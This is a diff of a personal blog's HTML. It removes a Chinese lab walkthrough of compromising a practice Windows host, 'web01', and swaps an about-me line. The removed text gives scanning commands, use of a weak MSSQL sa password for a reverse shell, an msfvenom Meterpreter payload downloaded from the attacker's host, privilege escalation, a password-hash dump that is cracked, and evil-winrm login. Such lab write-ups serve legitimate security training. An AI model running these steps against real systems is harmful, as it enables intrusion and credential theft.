@@ -269,89 +269,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="工程实践-web01"><a href="#工程实践-web01" class="headerlink" title="工程实践-web01"></a>工程实践-web01</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li><p><strong>虚拟机使用的是此版本 VMware Workstation 不支持的硬件版本，导致模块“Upgrade”启动失败，无法启动虚拟机。</strong></p>
-<blockquote>
-<p>‌修改.vmx配置文件‌：<br>找到虚拟机的.vmx配置文件，通常位于虚拟机的目录中。<br>使用记事本或Notepad++打开.vmx文件，搜索virtualHW.version字段。<br>将virtualHW.version的值修改为当前VMware Workstation版本的对应值。例如，如果当前使用的是VMware Workstation 16，就将virtualHW.version的值改为16‌12。</p>
-</blockquote>
-</li>
-<li><p><strong>kali 安装fscan <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50673174/article/details/129387883?utm_source=bbs_include">fscan</a></strong></p>
-<blockquote>
-<p>nmap -sT 192.168.93.0&#x2F;24扫出web01的ip:192.168.93.128</p>
-</blockquote>
-</li>
-<li><p><strong>.\fscan -h 192.168.93.128</strong></p>
-<blockquote>
-<p>start infoscan<br>192.168.93.128:80 open<br>192.168.93.128:21 open<br>192.168.93.128:1433 open<br>[<em>] alive ports len is: 3<br>start vulscan<br>[+] mssql 192.168.93.128:1433:sa 123456<br>[+] ftp 192.168.93.128:21:anonymous<br>[</em>] WebTitle <a target="_blank" rel="noopener" href="http://192.168.93.128/">http://192.168.93.128</a>     code:200 len:18167  title:Home<br>已完成 3&#x2F;3<br>[*] 扫描结束,耗时: 5.58307679s</p>
-</blockquote>
-</li>
-<li><p><strong>java -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</strong></p>
-<blockquote>
-<p>已经拿到权限但不是最高权限，卡壳了</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="再次尝试"><a href="#再次尝试" class="headerlink" title="再次尝试"></a>再次尝试</h2><p><strong>该靶机是目标局域网内的入口机器，本文目的是拿到 Web01 的最高权限并且实现远程登录</strong></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l(su下执行) <span class="comment"># 扫描局域网中的设备 自动检测本地网络接口</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>发现存在一台 IP 值为：192.168.93.2 的主机<br>使用 Fscan 进行扫描：<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/releases">fscan</a></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.93.128</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>发现 ftp 服务存在匿名访问，不过没有任何泄露<br>mssql 服务存在弱口令账号:sa 密码123456</p>
-</blockquote>
-<h3 id="反弹-SHELL"><a href="#反弹-SHELL" class="headerlink" title="反弹 SHELL"></a>反弹 SHELL</h3><blockquote>
-<p>下载 mssql 命令执行工具：<a target="_blank" rel="noopener" href="https://github.com/Mayter/mssql-command-tool/releases/tag/mssql">mssql-command-tools</a><br>并且生成 powershell 的反弹命令：PowerShell #3 (Base64)<a target="_blank" rel="noopener" href="https://www.revshells.com/">反弹 Shell 生成器</a></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 100</span><br><span class="line">./mssql-command-tools_Linux_amd64 -host 192.168.93.128 -u sa -p 123456 -P 1433 -c <span class="string">&#x27;生成的webshell&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>成功得到 powershell 的反弹</p>
-</blockquote>
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><blockquote>
-<p>当前用户权限为普通用户<br>生成 msf 反弹木马</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.130 LPORT=6666 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>开放 http 服务，让目标机器下载</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80 <span class="comment"># kali</span></span><br><span class="line"><span class="built_in">cd</span> C: <span class="comment">#PS</span></span><br><span class="line"><span class="built_in">mkdir</span> tmp <span class="comment">#PS</span></span><br><span class="line">curl 192.168.93.130/reverse.exe -O shell.exe <span class="comment">#PS</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>再开一个终端，打开 msfconsole</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">设置监听器 handler，并配置</span><br><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.93.130</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>回到 powershell 那里运行 exe 文件</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">.\shell.exe</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>kali可以看到成功进入 meterpreter<br>执行 getsystem 进行权限提升，可以看到提升到了 system 最高权限</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem <span class="comment">#提权</span></span><br><span class="line">meterpreter &gt; getuid <span class="comment">#查看是否提权成功</span></span><br><span class="line"><span class="built_in">cd</span> C:/Users/Administrator</span><br><span class="line"><span class="built_in">cat</span> flag01.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb136a448767792bae25563a498a86e6:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:ec989ddafb499b3b3ebf7220c417cc9d:</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>获取到用户密码 hash 值，这里只要<strong>cb136a448767792bae25563a498a86e6</strong>部分，是由 md5 进行加密的<br>将其放入解密网站：<a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5</a><br>成功得到密码: Admin@1234</p>
-</blockquote>
-<h3 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h3><p><strong>由于在真实的渗透测试环境下是无法直接接触到目标机器的，所以要找到远程登录的办法</strong></p>
-<blockquote>
-<p>进行 nmap 全端口扫描</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.93.128 -p- </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>发现存在 5985 端口，该端口用于 Windows 的远程管理<br>evil-winrm 是一个可用于黑客攻击 &#x2F; 渗透测试的 Windows 远程管理 (WinRM) Shell<br>由于知道了管理员的密码可以直接登录</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 192.168.93.128 -u Administrator -p <span class="string">&#x27;Admin@1234&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h4>
+        <h1 id="工程实践-web01"><a href="#工程实践-web01" class="headerlink" title="工程实践-web01"></a>工程实践-web01</h1>
+        
+          <a class="article-more-a" href="/2025/06/30/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/#more">more >></a>
+        
       
 
       
@@ -1126,7 +1047,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">很惭愧&lt;br&gt;&lt;br&gt;韩枫只做了一点微小的工作&lt;br&gt;谢谢大家</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">很惭愧&lt;br&gt;&lt;br&gt;请大家关注韩枫哔站 https://space.bilibili.com/1960644038?spm_id_from=333.788.upinfo.head.click &lt;br&gt;谢谢大家</div>
   	  	
     	</section>
     
